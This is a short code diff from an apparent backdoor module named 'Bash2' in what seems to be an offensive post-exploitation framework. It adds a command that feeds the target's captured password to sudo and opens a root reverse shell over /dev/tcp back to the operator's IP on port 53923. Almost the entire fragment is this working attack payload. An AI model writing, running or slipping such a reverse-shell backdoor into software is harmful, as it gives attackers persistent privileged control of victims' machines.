@@ -11,7 +11,10 @@ class Bash2(Backdoor):
         self.options = {
                 "port"   : Option("port", 53923, "port to connect to", True),
                 }
-
+        self.allow_modules = True
+        self.enabled_modules = {}
+        self.modules = {} 
+        self.command = "echo " + self.target.pword + " | sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; sh <&196 >&196 2>&196" % self.get_value("port")
     def check_valid(self):
         return True
 
